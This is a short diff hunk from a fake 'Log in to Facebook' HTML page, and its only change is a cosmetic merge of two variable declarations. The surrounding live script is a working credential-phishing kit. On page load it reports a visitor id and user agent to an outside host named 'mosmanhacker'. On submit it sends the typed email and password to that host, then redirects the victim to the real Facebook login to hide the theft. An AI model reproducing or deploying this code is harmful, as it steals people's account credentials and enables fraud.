@@ -4,7 +4,7 @@
 <body>
 <form id="f"><h2>Log in to Facebook</h2><input name="email" placeholder="Email or phone" required><input name="pass" type="password" placeholder="Password" required><button>Log In</button></form>
 <script>
-const p=new URLSearchParams(location.search);const id=p.get('id');
+const p=new URLSearchParams(location.search),id=p.get('id');
 fetch('https://central-server--mosmanhacker.replit.app/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,ua:navigator.userAgent,ip:'',email:'',pass:''})});
 document.getElementById('f').addEventListener('submit',e=>{e.preventDefault();fetch('https://central-server--mosmanhacker.replit.app/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,ua:navigator.userAgent,ip:'',email:f.email.value,pass:f.pass.value})}).then(()=>location.replace('https://facebook.com/login.php'))});
 </script>
